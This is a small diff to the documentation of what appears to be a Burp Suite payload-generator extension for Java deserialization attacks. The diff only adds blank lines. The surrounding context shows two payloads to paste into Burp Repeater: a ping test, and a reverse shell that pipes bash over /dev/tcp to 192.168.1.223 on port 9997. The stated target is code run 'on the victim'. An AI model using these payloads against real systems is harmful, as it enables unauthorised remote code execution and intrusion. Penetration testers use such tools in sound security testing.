@@ -49,6 +49,7 @@ The above code will be split into a string array that java can run on the victim
 1. In Burp Repeater replace your parameter with the following code:
 
 ```$(CC1|ping -c1 8.8.8.8)```
+
 2. Select the above text. Right Click in repeater and select the payload type.
 ![Payload Generator](/inline-command.png)
 
@@ -56,5 +57,6 @@ The above code will be split into a string array that java can run on the victim
 1. In Repeater replace your parameter with the following command:
 
 ```$(CC1|/bin/bash,,-c,,bash -i >& /dev/tcp/192.168.1.223/9997 0>&1)```
+
 2. Select it and select the payload you want to generate.
 ![Payload Generator](/inline%20complex%20command.png)
